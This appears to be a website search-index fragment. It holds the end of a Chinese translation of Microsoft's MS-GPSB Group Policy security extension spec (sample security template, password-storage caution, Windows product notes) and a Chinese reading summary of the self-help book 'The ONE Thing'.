配置多种类型设置的示例 在下面的示例中，管理员指定，对于应用特定GPO的计算机，前面各节中指定的所有设置都按指定配置。\n[Unicode] Unicode=yes [Version] signature=\"$CHICAGO$\" Revision=1 [System Access] MinimumPasswordLength = 8 PasswordComplexity = 1 PasswordHistorySize = 10 [Event Audit] AuditObjectAccess = 3 AuditAccountManage = 2 AuditProcessTracking = 3 AuditAccountLogon = 1 [Group Membership] Group1__Memberof = Group3 Group1__Members = member3,member2,member1 Group2__Memberof = Group3 Group2__Members = member3,member1 Group3__Memberof = Group3__Members = member45 安全 5.1 实现者的安全注意事项 ClearTextPassword标志，如2.2.1.1节所述，指示密码是否使用可逆加密来存储。此策略为使用要求了解用户密码以进行身份验证的协议的应用程序提供支持。通过使用可逆加密存储密码本质上与存储密码的纯文本版本相同。因此，除非应用程序要求超过保护密码信息的需要，否则不建议使用此策略。\n5.2 安全参数索引 5.2.1 影响协议行为的安全参数 Name of setting Default value Explanation of setting MaxNoGPOListChangesInterval详情见 [MS-GPOL]. 960 时间间隔（以分钟为单位），它设置了客户端在不重新应用未更改的GPO的情况下可以工作多长时间的最大限制。 5.2.2 协议承载的系统安全参数 Settings category Comments System Access Defined in section 2.2.1. Kerberos Policy Defined in section 2.2.2. System Log Defined in section 2.2.3. Security Log Defined in section 2.2.3. Application Log Defined in section 2.2.3. Event Audit Defined in section 2.2.4. Registry Values Defined in section 2.2.5. Privilege Rights Defined in section 2.2.6. Registry Key Defined in section 2.2.7. Service General Setting Defined in section 2.2.8. File Security Defined in section 2.2.9. Group Membership Defined in section 2.2.10. 6 附录A：产品行为 本规范中的信息适用于下列Microsoft产品或补充软件。对产品版本的引用包括对这些产品的更新。\n§ Windows2000Server操作系统\n§ Windows XP操作系统\n§ Windows Server 2003操作系统\n§ Windows Vista操作系统\n§ Windows Server 2008操作系统\n§ Windows 7操作系统\n§ Windows Server 2008 R2操作系统\n§ Windows 8操作系统\n§ Windows Server 2012操作系统\n§ Windows 8.1操作系统\n§ Windows Server 2012 R2操作系统\n§ Windows 10操作系统\n§ Windows Server 2016操作系统\n§ Windows Server操作系统\n§ Windows Server 2019操作系统\n§ Windows Server 2022操作系统\n§ Windows 11操作系统\n如果有例外，在本节中注明。如果出现带有产品名称的更新版本、service pack或知识库(KB)编号，则该更新中的行为已更改。除非另有规定，否则新行为也适用于后续更新。如果产品版本与产品版本一起出现，则在该产品版本中的行为是不同的。\n除非另有说明，本规范中使用“应该”或“不应该”等术语规定的任择行为的任何声明意味着产品行为符合“应该”或“不应该”的规定。除非另有说明，“可能”一词暗示产品不遵循处方。\n\u003c1\u003e第2.1节：Windows 2000Server、Windows XP和Windows Server 2003不支持服务器消息块(SMB)版本2和3协议。这些版本的Windows使用SMB，如[MS-SMB]第1.3节所述。\n\u003c2\u003e第2.2.1.1节：Windows忽略RequireLogonToChangepassword设置。\n\u003c3\u003e第2.2.3节：在Windows 2000操作系统、Windows XP、Windows Server 2003、Windows Vista、Windows Server 2008、Windows 7和Windows Server 2008 R2操作系统中，忽略RestrictGuestAccess设置。\n\u003c4\u003e第2.2.4:Windows不会为策略更改失败生成安全审核事件记录。\n\u003c5\u003e第2.2.4节：Windows不会为进程跟踪失败生成安全审核事件记录。\n\u003c6\u003e第2.2.11节：Windows 2000、Windows XP和Windows Server 2003不支持这些设置。\n\u003c7\u003e第2.2.11.1节：在Windows上，这也称为Windows XP本机模式。\n\u003c8\u003e第2.2.11.2节：将允许Windows二进制文件在没有同意或凭据的情况下执行需要提升的操作。\n\u003c9\u003e第3.2.3节：Windows 2000 Server、Windows XP和Windows Server 2003不支持服务器消息块(SMB)版本2和3协议。这些版本的Windows使用SMB，如[MS-SMB]第1.3节所述。\n\u003c10\u003e第3.2.5.6节：Windows 2000 Server、Windows XP和Windows Server 2003忽略此注册表设置，并处理和应用事件审核策略部分下的设置。\n7 变更跟踪 本节标识了自上次发布以来对此文档所做的更改。更改分为主要、次要或无更改。\n修改类专业是指文件中的技术内容被重大修改。重大更改会影响协议互操作性或实现。主要变化的例子有：\n§ 合并了对互操作性要求的更改的文档修订。\n§ 捕获协议功能更改的文档修订。\n辅修课的意思是阐明了技术内容的含义。微小的更改不会影响协议互操作性或实现。小变化的例子是更新，以澄清句子、段落或表级别的歧义。\n修订类None意味着没有引入新的技术更改。编辑和格式可能做了一些小的修改，但相关的技术内容与上次发布的版本相同。\n下表列出了对此文档所做的更改。欲了解更多信息，请联系dochelp@microsoft.com。\nSection Description Revision class 6 Appendix A: Product Behavior 已为此版本的Windows客户端更新 Major ",
    "description": "",
    "tags": null,
    "title": "[MS-GPSB]Window核心协议-安全扩展协议",
    "uri": "/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/Windows/Powershell/ms-gpsb_window%E6%A0%B8%E5%BF%83%E5%8D%8F%E8%AE%AE-%E5%AE%89%E5%85%A8%E6%89%A9%E5%B1%95%E5%8D%8F%E8%AE%AE/index.html"
  },
  {
    "content": "《最重要的事，只有一件》加里·凯勒、凯勒,帕帕森. 整理by.x7peeps 目录 1. 只做一件事 探索成功秘诀所付出的代价\n每次获得巨大成功的时候，都是我专注于一件事的时候；而且，我专注的点也应随着目标的变化而变化。 聚焦你的目标\n每次获得巨大成功的时候，都是我专注于一件事的时候；而且，我专注的点也应随着目标的变化而变化。 所以，尽量缩小目标，专注于一处，那就是成功。 2. 多米诺效应 达到卓越 真正的成功人士深知这一点，所以他们每天都会为当天要处理的事情排好优先次序，完成最紧要的事就像推倒第一块多米诺骨牌，接着剩下的问题都会迎刃而解。 博学的人会花时间学习，技艺精湛的人会花时间锤炼技术，成功的人会花时间做事，富有的人会花时间赚钱。时间是关键。成功总是逐步获得的，一步一个脚印，一次做好一件事。 3. 成功有迹可循 关键产品，关键业务\n最重要的事只有一件。重要的事有很多，但最重要的事只有一件。——罗斯·加伯 找到目标之后，你看待商业世界的角度就会完全不同。如果你的公司现在还不清楚应该专注于什么，那么你当下的专注点就是找到它。 关键人\n每个人都有一个“关键人”，他对于你有着非凡的意义，他也有可能是第一个影响、训练、领导你的人。 没有人能仅靠自己就成功的，没有一个人会这样。 钟情一件事，术业有专攻\n一心一意很重要，下定目标，勇往直前。——巴顿将军 坚持一个目标才能成功。——文斯·隆巴迪 每个成功人士的人生轨迹都是“只做一件事”的佐证，因为它是指向成功的绝对真理。 一个人生选择\n在与传染性疾病对抗的过程中，基金会将重点放在了疫苗上。盖茨解释说：“我们要找到最有效的……疫苗，它是保障健康的一剂灵药，而且价格不高。”以疫苗为重点的经营模式得益于梅琳达从一开始就提出了指导性的问题：“怎样把钱用到刀刃上，才能使其发挥最大效用？”由此可见，盖茨夫妇是“只做一件事”的最好例证。 一个目标\n终极目标是成功的关键，也是成功之路的起点。 恼人的“真相”\n让我们陷入困境的不是无知，而是看似正确的谬误论断。——马克·吐温\n因为太多的事让人分心——长此以往，这些事就会扰乱我们的思想，误导我们的行动，最后喧宾夺主。\n阻止你成功的6个谎言\n1.每件事都很重要 2.同时处理多件事 3.有规律地生活 4.缺乏意志力 5.试图平衡生活的各个方面 6.大即不佳 第一部分 谎言 误导并阻碍成功 4. 每件事都很重要 平等是一个谎言。\n认识到这一点，才能做出正确的选择。 生活中的芝麻小事永远不应阻挡你去追逐伟大的事。——约翰·沃尔夫冈·冯·歌德 为无谓的事做无用功\n成功人士对待办事项的认识清醒到位，所以排序准确。 朱兰解码\n帕累托（朱兰提出的帕累托法则）为我们指明了方向：绝大部分所得恰恰是靠较少部分付出而获得的。取得卓越成就所需的付出往往比我们想象的要少。\n理查德·科克在《80/20法则》中总结：“80/20法则认为少量的原因、投入、付出常常产生大量的结果、产出、回报。” 朱兰的理论是，万事并非同等，有的事更重要，而且重要得多。参照帕累托法则，我们可将“待办事项清单”转变为“成功清单”。 极端的帕累托\n把帕累托法则用到极致。缩小施力范围，找出你的20%，继续在这20%里缩小范围，找出关键中的关键。 你必须由大化小，慢慢缩小范围，直至找到最重要的那一个目标。它一定是不偏不倚的那个目标，也是你必须坚守的唯一目标。 建议：\n1.缩减。不要纠缠在烦乱的忙碌之中，要执着于效率。你每天的工作都应围绕着终极目标而展开。 2.极致。一旦你意识到什么是重要的，就要继续追问更重要的是什么，直到找到那件最重要的事。将主要精力放在成功清单的第一项上。 3.拒绝。为紧要的事腾出时间，对其他事情暂时说“不”或者拖延一阵。 4.别掉进“待处理事项”的陷阱。区别对待每件事，而且要真正做到。千万不要认为所有的事情都需要做完才行，也不要相信“要成功就得完成所有目标”这样的观点。别掉进“待处理事项”的陷阱，划掉清单上的琐事绝不能助你成功。每件事都不同，选择最重要的事才会有所裨益。 这件最重要的事或许是你着手的第一件事，也许是你处理的唯一一件事。无论如何，去做最重要的事才是关键。 5. 你可以同时处理多件事 同时兼顾几件事只是一个美好的谎言。\n心猿意马\n我们不是时间太少、事情太多，而是一直在暗示自己要同时做更多的事。 切换任务的障眼法\n许多人根本没有意识到他们为此付出了这么大的代价。 一心不可二用\n不管怎样，结论很明确：同时处理几件事会降低我们的效率和反应速度。 失魂落魄\n为什么我们做紧要事的时候还会分心呢？ 建议\n1.分心是天性。精神无法集中时不要过分自责，人人都会走神。 2.同时做几件事会得不偿失。无论个人生活或者工作，分心都会导致选择错误、致命的损失和不必要的压力。 3.分心减少成效。同一时间里做太多事，就会什么也做不成。把你分散的注意力收回来，用在最重要的那件事上。 若要“只做一件事”的方式发挥其魔力，你就不能认同同时做几件事的处事方式。此法虽可行，但不可靠。 6. 过上有规律的生活 其实，我们需要的不是坚持，而是习惯。要养成习惯，我们就需要自律。\n获得成功只需要你去做对的事，而不是做对每件事。\n规律训练成效显著\n做正确的事能够将你从无谓的小事中解救出来。 66天养成一个习惯\n调查结果显示，养成一个习惯平均需要66天。 动用自制力、保持好习惯不仅越来越容易，而且能够惠及生活的其他方面。这些学生不仅规律地从事着主要任务，其他方面也受益颇多。 建议\n1.不要试图成为一个完全自律的人。养成一些有用的好习惯，并用自制力去强化这些习惯。 2.一次养成一个习惯。成功是循序渐进达成的，别指望一蹴而就。没有谁的意志力可以强大到一次养成好几个习惯。超级成功人士也不是超人，他们只是有选择性地努力养成了多个好习惯，一次只培养一个，循序渐进。 3.耐心培养每个习惯。你要持之以恒，直至习惯养成。养成一个习惯平均需要66天。一旦习惯养成，你就可以选择继续努力加固，或者再养成一个新习惯。 你本人就是你所做的事情的集合，如果你不断重复正确的行为，那么成功就不再只是一个动作，而是一个你亲手打造的习惯。控制好你的自制力，选对习惯，你无须向外索取，卓越的成就自会找上门来。 7. 意志力触手可及 古希腊神话中的奥德赛明白意志力是靠不住的，所以当船驶经塞壬女妖的魅惑之地时，他让船员把他绑在了桅杆上。——帕特里夏·科恩\n意志力触手可及只是一个谎言。\n棉花糖实验\n利用意志力也要把握好时机。一旦拥有了强大的意志力，你便拥有了机遇。意志力虽与性格息息相关，但驯服它的最好方法便是使用它。 所以，当母亲对你说“好事多磨”时，她可不是在开玩笑。 意志力并非取之不尽用之不竭\n意志力的电力是有限的，但你可以找到适当的时间重新充电。 脑力越用越少。 精神食粮\n研究证明，意志力是一种需要较长时间来恢复韧性的精神肌肉。你在一件事上用的意志力太多，不等它恢复就投入下一件事，那么表现就不会令人满意。想表现得更好，就得给大脑补充养料，来点儿“精神食粮”。你可以吃一些能缓慢升高血糖含量的食物，如碳水化合物、蛋白质等。正所谓“吃什么补什么”。 当意志力降低时\n当心，你在意志力降低时也可能犯错。 当最重要的事情完成时，意志力就开始降低，这时默认设置会决定你的表现水平，结果通常都是平庸。 测测你的意志力\n我们应多思考，多观察，尊重它。趁意志力高涨时做那件重要的事，给意志力留出一日之计。\n哪些因素会消耗你的意志力：\n培养新习惯 考试 屏蔽干扰 尝试引起他人的注意 抵制诱惑 战胜恐惧 压抑情感 做不喜欢的事 抑制侵犯 在长期回报和短期利益之间做选择 防止冲动 选择长期或短期奖励 谈及管理意志力，时机是最重要的，你需要保证在做最重要的事时意志力满格，分心的事最好别在这时找上门。剩下的时间你还需巩固成果，防止外界因素的破坏。如果你想让一天的收获达到峰值，那么就在意志力消亡之前向目标冲刺。自制力总会衰竭，趁它还在时应赶紧着手做最重要的事。\n建议\n1.别让你的意志力太分散。珍惜每天有限的意志力，找出最重要的事再充分利用。 2.注意饮食。若要意志力满格，首先要保证能量满格，别因为大脑供能不足就妥协。健康饮食，规律进餐。 3.安排任务处理时间。在每天意志力最强的时候做最重要的事。意志力越强，成功越有保障。 不要和意志力作对。你应该根据它的习惯安排你的生活，而不是反其道而行之。意志力也许不是触手可及的，但当你把它用在紧要的事上时，它就是值得信赖的。 8.平衡工作与生活 平衡的生活就是一个谎言。\n神话的起源\n纵观历史，让我们的生活保持平衡是一种由来已久的权利。千百年来，工作就是生活。如果你不工作（打猎、种植农作物或饲养牲畜），你就无法生存下去。 拉尔夫·戈莫里在其2005年的著作《一起生活，两处工作：双职工家庭及其工作与生活的平衡》中这样写道：“以前一个家庭中有一个人负责挣钱养家，另一个人专心做家务；现在则是两个人都在挣钱养家，没有人操持家务了。” 因为与现实生活的挑战息息相关，“工作与生活的平衡”这一理念已经广为人知，并吸引了诸多关注。 平衡与失衡\n若想面面俱到，必然每件事都会打折扣，达不到预期的效果。\n我们不应该追求平衡是因为奇迹不会在中间点上发生，奇迹只有在追求极致的过程中才会发生。可是追求极致必定会带来真刀真枪的挑战，我们当然明白成功总在平衡之外，却不知道该如何应对失衡的人生。 超长的工作时间会影响到个人生活。如果笃信勤恳即是美德，我们就会对工作产生抱怨：“我都没有自己的生活了。”其实很多时候，事实与之相反。即使工作的触角没有那么长，生活中也会有很多不得不去做的事情，这时我们也会感到挫败，感到没有自己的生活。俗话说，祸不单行。你若在工作和生活中都摆出较高的姿态，要求颇多，就会让人十分崩溃，那时我们更会哀号：“我没有自己的生活！” 时间不等人\n当你和时间打赌时，你下的赌注也许是你无法偿还的。即使你胜券在握，也要想想你能否承受得了失去的一切。 时间从不等人。有的事情必须做到极致，因为等待也许会让你永远错过。 和时间玩游戏，一定会让你悔不当初。若中间部分处置不当，无法调节生活和工作的关系，这也许会成为最让你追悔莫及的一件事。你必须懂得，时间是不可逆转的。 制衡——短线制衡和长线制衡\n当一个人专注于非常重要的事情时，总会有其他的事情无法顾及。不管你怎么努力，每一天、每个星期、每个月、每一年甚至你的一生，总会发现有些事情无法做完。试图完成所有的事情其实是相当愚蠢的。\n要取得非凡的成就，你就必须在一些无关紧要的事情上有所取舍，这时制衡就派上了用场。制衡的作用，就是在你走得太远之前把你拉回来，使你不至于迷失；在你呆滞时敲响警钟让你回过神来，毕竟时不我待。 想要取得非凡的成就，你就必须在繁杂事物中去粗取精，选择最重要的事情、并为之付出足够的时间。\n如此一来，你只会花零星的时间去应付其他事情，因此严重失衡将是不可避免的。至于个人生活，制衡的秘诀则是关注。关注你的心灵和身体，关注你的家人和朋友，关注你的个人需求——如果你想要幸福的生活，上述要素缺一不可。 你既不能为了工作牺牲其中任何一项，也不能为了某一项而放弃其他要素。你可以将生活的重心在这些要素中快速地调整，同时兼顾不同的要素，但是不能长时间地对某一要素置之不理。我们的生活需要严格的制衡。 要记住：若要做出一番成就，你就会长期处于失衡的状态。长线调整能确保你专注于最重要的事，即使其代价是牺牲那些相比之下没那么重要的事情。在生活中，所有的要素一个都不能少，都需要顾及；而对于工作来说，取舍是常态。\n生活是一个寻求平衡的过程\n为重要的事情不懈努力的时候，你自然会打破平衡的状态，将时间的天平向它们倾斜。 此时，你面对的挑战就不再是要不要走出平衡的状态，因为你必须打破平衡，现在的挑战是你要为重要的事情分配多长时间。你应该找到工作之外的优先事务，也要清楚哪件事是工作中的重中之重。在解决了工作中的首要事务后，你就可以从容地对付生活中的大事了，这样也不会影响工作。 因此，该工作的时候就好好工作，该玩的时候就尽情地去玩。生活就像走钢丝，如果你把轻重缓急搞混了，就会把事情搞砸。 建议\n1.想象一下一根扁担挑两桶水的情景。把工作和个人生活放在两个不同的桶里——这不是为了将两者分离，而是要达到制衡。而且，工作与生活都有各自制衡的目标和方法。 2.保持工作水桶的制衡。把工作当作一门必须掌握的技术或学问，这样你就会花很多时间在这件事上，之后的每一天、每个星期、每个月甚至每年你都将处于失衡状态。你可以将工作内容分成两部分：最重要的事和其他事。把那一件最重要的事做到极致，其他事情过得去就好——想要取得事业上的成功就必须这样做。 3.保持生活水桶的制衡。你要明白，生活是由很多内容组成的。若要拥有幸福的生活，则需要你付出一定的时间来用心经营。一旦忽视了生活细节，你就会尝到苦果。因此，你应保持关注，不能放松对制衡状态的把控，这样才能让你的生活充满活力。生活就该如此。 开启你的制衡模式吧，在生活中优先处理紧要之事，当你有余力时再处理其他事情。可以说，精彩的生活就是制衡的生活。 9.大即不佳 可见，“大就是坏”这种说法是一个谎言。\n谁会害怕“大”和“坏”？\n当我们把“大”和“坏”联系在一起的时候，就会导致畏首畏尾的思考。降低目标能使我们感到安全，待在舒适区看上去是一种谨慎的做法。但是，其消极的一面也是显而易见的——当“大”被认为不好时，各类小事就霸占了我们的时间，因此远大的理想就永远见不到曙光。 显而易见的错误\n所以，每个人都不知道自己在追求进步方面的极限在哪里，所以担心自己在浪费时间。 朝着伟大梦想前进\n那些成为成功之跳板的行动都始于远大的理想。 你现在获得的成功将使你更强大，或者会让你受到限制。 事关重大\n在对儿童的研究过程中，德维克发现了两种行为思维模式：一种是发展模式，这样的人通常眼光长远，追求进步；另一种是固定模式，这样的人会设定人为的限制来避免失败。 维克称，和拥有固定模式的儿童比起来，拥有发展模式的儿童能够更好地掌握学习方法，他们很少感到无助，并会做出更积极的努力，在课堂上学到更多知识。他们不给自己设限，而且更有可能发掘出自己的潜力。 德维克指出，思维模式能够而且确实在改变我们的人生。和其他习惯一样，你也能够改变你的思维模式，直到将正确的模式培养成习惯。 给生活打气\n你必须从大局出发思考问题，相信自己将拥有成功与幸福。你要坚信，只要人生不设限，成就和富足终会到来。 建议\n1.志存高远。停止追问自己：“接下来我要做什么？”这至多是取得成功的慢车道，甚至是出口匝道。你要问自己更宏大的问题。一条很棒的经验法则，就是在你生活中的每一处都双倍下注。如果你的目标是10，那么就要问自己：“我怎样才能达到20？”为自己制定一个远超过自己期待的目标，那么你将做出能保障你原本目标的计划。 2.不要按照菜单点菜。苹果公司在1997年有一个很出名的广告——“非同凡‘想’”，其中有很多著名人物，例如拳王阿里、鲍伯·迪伦、爱因斯坦、希区柯克、毕加索、甘地，以及其他一些名人。他们都从不同的角度看待问题，从而改变了这个世界。重点在于他们从不选择已提供的选项，而是创造出了史无前例的结果。正如该广告提醒我们的一样：“有些人非常疯狂，认为自己能够改变这个世界，他们也确实做到了。” 3.大胆行动。没有大胆的行动，伟大的设想就不会有任何结果。一旦你提出了一个大问题，就要停下来想象一下：如果找不到答案，生活会是什么样？你可以向那些已经找到答案的人学习，看看他们的模式、体系、习惯和人际关系是怎样的。我们都认为自己是与众不同的，因此那些对别人有用的因素通常也适用于我们。 4.不要恐惧失败。恐惧是通向成功的必经之路。拥有发展的思维模式，不要担心你的未来。非凡的成就不仅建立在非凡的成功之上，它们也建立在失败之上。更准确地说，成功必然要建立在失败之上。失败时，我们就会停下来，问问自己需要做什么才能取得成功。你要在错误中不断学习，不断成长。不要害怕失败，你应将失败看作学习过程中的一部分，坚持不懈地为发掘自己的真正潜力而奋斗。 不要让那些狭隘的思维限制了人生。从大局思考，志存高远，大胆行动，然后看看你是否能改变生活的格局。 第二部分 真理 提高效率的极简之道 放手 不要轻易对这个世界下定论，因为它就是你所看到的样子。——埃里希·海勒 我发现：我们想得太多，计划得太多，对工作和生活都分析得太细。结果，投入大量的时间既无效果，也不利于健康。我们所做的这一切其实和成功关系不大。我们不懂得管理时间，实际上成功的关键并不在于我们做的所有的事，而在于我们能够做好的关键的几件事。 我终于明白了成功的定义，那就是在你的生命中，如果你能诚实地说“我目前所处的位置就是我应该达到的地方，我正在做我应该做的事情”，那么你的生命将充满无限的可能性。 最重要的是，我明白了，成功的关键就在于其背后蕴藏的“一生只做一件事”这个简单真理。 10.关键问题 超过别人的秘诀在于开始行动。怎样开始呢？要把复杂而浩大的工程分解成小的、能够处理的事情，然后选准其中一件事下手。——卡内基\n生活本身就是一个问题\n道理很简单：答案源于问题，任何答案的质量都是直接由问题的质量所决定的。\n问题问错了，得到的答案肯定也是错的；只有问对了问题，才会得到正确的答案。如果你提出的问题非常有深度，那么得到的答案将改变你的一生。\n我意识到，生活本身就是一个问题，如何生活就是这个问题的答案。领悟到这个道理的那一刻是我一生中最有收获的一个瞬间。我们如何对自己提出问题，决定了我们未来将如何生活的答案。\n你需要问问自己：关键的问题到底是什么？\n任何梦想成功的人最后都会发现，要达到这个目的，必须以不平凡的方式来生活，除此之外，别无他法。“找到关键问题”就是这里讲的方法。在这个世界上，没有人会告诉你应该怎么做，而关键问题会帮助你找到最佳答案，让你通过这个答案获得最理想的结果。 此时，你到达了第一张多米诺骨牌的位置。\n若想拥有最美好的一天、一个月、一年或者最令人满意的职业生涯，你必须不断地问自己：“我的关键问题是什么？”只有一遍遍地问自己，你才会慢慢地按照每件事的重要程度来安排你的生活。每当你思考当前的关键问题时，你就会知道下一步该做什么了。这个方法的好处在于帮助你有条不紊地逐一处理待办事项。当你完成了正确的任务，就意味着你打造了正确的思维模式；技巧用对了，每件事之间的关系也就厘清了。在关键问题的指引下，你将朝着正确的方向前进，如此一来，你就会领略到多米诺骨牌的神奇之处了。 问题解剖\n第一部分：“我能做的最重要的事是什么？”\n你必须做、可能做、将会做的事都要靠边站，你真正做的事才最重要。——谢尔·希尔弗斯坦 这个问题激发你去行动。“最重要的事”就意味着答案是一件事，而不是很多事，你必须想着某件具体的事。你必须做出选择，而且只能选择一件最重要的事。 有很多事我们必须做、可能做、将会做，但却永远不去做。你因为“能做”而去做，这种力量比意念上的“想做”要大得多。 第二部分：“做了这件事就会……”这其实是在告诉你，你的答案必须达到一个标准。\n这个标准让你从“随便找件事做”转化为“为了某个明确的目标而去做某件事”。“做了这件事就会……”告诉你，你必须深挖下去，因为做了这一件事之后，就会有另一件事随之发生。 第三部分：“……让其他事变得更简单或是不必要了。”\n若要抓住关键问题，你就必须找到第一张多米诺骨牌，然后把心思全都花在这件事上，直到你推翻了第一张牌。之后，会出现两种情况：一种是其他的牌就在这张牌后面，另一种是其他牌正准备或是已经倒下了。 建议\n1.问题提得好，才能得到正确的答案。关键问题是引导你找到正确答案的那个问题。有了它，你就会在工作上、业务上，或者其他任何你想获得成功的事情上取得突破。 2.关键问题包括两个方面：大局及焦点。大局观会帮助你找到正确的方向，而焦点则能指引你采取正确的行动。 3.关于大局的问题：“我要做的那件最重要的事是什么？”你可以通过这个问题来指引你未来的生活和事业。这个问题就像指南针一样，帮助你找到方向继而弄清楚自己究竟想要什么，想为他人及社会做出什么贡献。它将教会你正确地处理和朋友、家人以及同事的关系，确保你所采取的行动是正确的。 4.关于焦点问题：“我现在要做的那件最重要的事是什么？”任何时候你都可以问自己这个问题，这样你就会把注意力集中在最重要的那件事上面，从而找到支点，也就是第一张多米诺骨牌。把焦点问题想清楚，这样不管多么复杂的工作，你都能应对自如。同样的方法也适用于你的生活，你将知道自己最需要做的是什么，以及哪些人才是你生命中最重要的人。 找准了关键问题，才有可能获得好的结果。在这个过程中，你其实是在规划自己的工作和生活，思考如何在最重要的事情上取得最大的进步。 不管你想得到的答案是意义重大还微不足道，关键问题都是帮助你获得成功的诀窍。 11.成功的习惯 成功其实很简单。你只要在正确的时间，用正确的方法，做正确的事情。——阿诺德·H·格拉索\n当我们开始用一种方法来思考或行动，并且把这个方法沿用下去时，我们就是在养成一个习惯。是否要养成某个习惯，并通过这个习惯帮助我们获得自己想要的东西，对此我们必须做出选择。如果我们选择了这个习惯，那么关键问题就是帮助我们获得成功的最重要的习惯了。\n从大事着手，看看你做完之后走到哪一步了。时间一长，你就会找到感觉，知道什么时候该考虑大局、什么时候该关注焦点问题。\n因此，关键问题会在人生中的不同阶段引领你找到你最重要的那件事。在不同的时期，你只需要转移自己的注意力，重新思考关键问题到底是什么。你可以画一个时间框架图，标清现在要做的事以及今年要做的事，以此判断每件事的轻重缓急。你也可以计划5年内或具体某一时期要做的事情，以便有一个大致的规划，让自己对准目标进发。 你要好好思考其中的几个关键问题。首先，想好归类，然后再提问题，给每个问题都框定一个时间，最后还要加上“做了这件最重要的事之后就会让其他事情都变得更简单或不必要了”。\n我的精神生活…\n•我做了哪件最重要的事，才能帮助别人？ •我做了哪件最重要的事，才能变得更虔诚？我的身体. •我做了哪件最重要的事，才能达到饮食的均衡？ •我做了哪件最重要的事，才能让自己坚持锻炼？ •我做了哪件最重要的事，才能释放压力？ 我的私生活\n•我做了哪件最重要的事，才能提高某方面的能力？ •我做了哪件最重要的事，才能腾出时间做某事？ 我的重要圈子\n•我做了哪件最重要的事，才能改善我和另一半的关系？ •我做了哪件最重要的事，才能提高孩子的学习成绩？ •我做了哪件最重要的事，才能来表达对父母的感激之情？ •我做了哪件最重要的事，才能让家人变得更加坚强？ 我的工作\n•我做了哪件最重要的事，才能保证自己能够实现目标？ •我做了哪件最重要的事，才能提高自己的能力？ •我做了哪件最重要的事，才能帮助整个困队获得成功？ •我做了哪件最重要的事，才能使我的事业更上一层楼？ 我的生意\n•我做了哪件最重要的事，才能增强竞争力？ •我做了哪件最重要的事，才能提高产品的质量？ •我做了哪件最重要的事，才能增加利润？ •我做了哪件最重要的事，才能提高客户的满意度？ 我的财富\n•我做了哪件最重要的事，才能增加我的净资产？ •我做了哪件最重要的事，才能增加投资中的流动资金？ •我做了哪件最重要的事，才能还清信用卡账单？ 建议\n那么，如何让“那件最重要的事”成为你日常生活的一部分呢？怎样把那件最重要的事做好，以确保你在工作上和工作以外的其他方面都能取得令你满意的结果呢？我从自己的经验以及和别人共事的过程中得出了一些结论：\n理解并且坚信你要做的那件最重要的事。第一步是要理解那件事是什么。要相信做好那件最重要的事，你的人生就会因此发生改变。如果你既不理解，也不相信，你也就不会采取行动。 把那件最重要的事利用起来。问问自己关键问题是什么。每天早上醒来问自己：“今天，我做了哪件最重要的事之后就会让其他事变得更简单或不必要了？”你问了自己这个问题之后，就会清楚该往哪里走了。如此一来，你做事的效率会提高，你的生活也会变得更轻松。 每天问自己 “要做哪件最重要的事”，并把它变成习惯。当你把这件事变成习惯时，你就会把它的所有潜能都激发出来，帮助你获得成功。研究表明，这个过程大约会持续66天。不管你需要几个星期还是几个月来养成这个习惯，你都要坚持下来，直到它成为你生活的一部分，从而改变你的生活。如果你对此不够重视的话，这就说明你并不是那么想成功。 不断地提醒自己。找一些方法提醒自己，思考关键问题是什么。最好的方法是在你工作的地方写个字条：〝在最重要的事面前，其他事都不重要。”把笔记本、电脑屏保、日历提醒都利用起来，帮助自己养成好习惯。你可以写上：“完成了最重要的事就等于获得了令人满意的结果”，或者“这个习惯会帮助我实现目标” 寻求支持。研究表明，你身边的人对你的影响非常大。和同事组成成功互助小组，这样你每天都可以从他们身上获得灵感。让你的家人也加入，和他们分享你做的“那件最重要的事”。让他们认识到，找到“最重要的事”这个习惯可以帮助他们提高效率，取得各方面的突破。 找到最重要的那件事，也是很多好习惯的基础，所以你要坚持下去。运用之前列出的方法，为每个阶段确立目标，这样才能保证每天都有进步。\n12.如何找到正确答案 我们不能决定未来，但我们可以决定养成什么样的习惯，正是这些习惯决定了我们的未来。——F·M·亚历山大 这个过程其实很简单：提出一个好问题，然后想办法找到正确答案。一切都只需要这两个步骤而已，和之前讲的那个习惯一样简单。 提出一个好问题 第四象限。小而具体 第三象限。小而广 第二象限。大而广 第一象限。大而具体 将如何使它的作用发挥得更充分呢？你可以把这个问题转化为关键问题：“我如何才能使销量在半年内增加一倍，并且使其他事情随之变得更简单或者不必要？” 找到正确的答案 答案分很多种：具有可行性的答案、延伸答案，以及可能的答案。 具有可行性的答案\n你能获得的最简单的答案是在你的知识、技能和经验范围之内的答案。你可能已经知道该怎么做，并且不用太花心思就能找到这种答案，我们称之为“具有可行性的答案“。 延伸答案\n这种答案仍是在你的知识、技能和经验范围之内，但你需要花很大力气才能获得。你可能要做一些研究，看看别人如何获得这样的答案。在这个过程中，你可能会感到一种不确定性，因为你需要拓展自己，以达到你的能力极限。 可能的答案\n一个可能的答案存在于已知和已做的领域之外。当你树立了一个具有弹性的目标时，你才能着手研究其他成功者的人生，而且不能就此停滞不前。 正确的答案可以造就非凡的成就。通过两个步骤可以找到正确的答案。 第一步，对伟大的成功者进行深入和全面的研究。寻找可以为你指明方向的线索和榜样，研究其他人研究过的相关成就和结论。其他人的研究和经验是寻找答案的最佳出发点。 2.第二步，跟随趋势，对于成功者的研究是至高点，而接下来发生的一切——这就是趋势。为个人目标采取行动，设立基准、跟随趋势都是最好的选择。一个全新的答案往往需要全新的行为，所以你也不能就此停滞。 建议\n从大局思考，并明确问题。制定一个自己想要达到的目标就像在提问题。这个步骤很简单，从告诉自己“我想要这样做”或问自己“我如何做到这一切”开始。最好的问题，或者说最佳的目标，都是大而明确的：“大”是因为你想获得非凡的成就；“明确”则可以让你在前进的道路上找到方向、全力以赴。一个大而明确的问题，尤其是重点问题，可以帮助你找到最佳的答案。 2.思考可能性。制定一个可行的目标几乎等同于重新检查自己的问题清单。一个具有弹性的目标将更具挑战性，它能够让你拓展自己的能力去实现这个目标。最好的目标是指探索无限的可能性。当你遇到那些经历过变化的人和组织时，你便会理解这就是成功的秘诀。 设立基准，跟随趋势，找到最佳答案。没有人拥有魔力水晶球，但实践在预知未来事物方面具有超凡的作用。没有什么竞争者能够同那些最早取得成功的人和组织分享其成果最好的一部分。设立基准，跟随趋势，为非凡的结果寻找非凡的答案。 第三部分 成就卓越 释放你内在的潜力 卓越成就 即便你已步入正轨，但如果你只是坐在哪里，那么也有可能一无所获。——威尔罗杰斯\n生活中有这样一个自然规律类似公式： 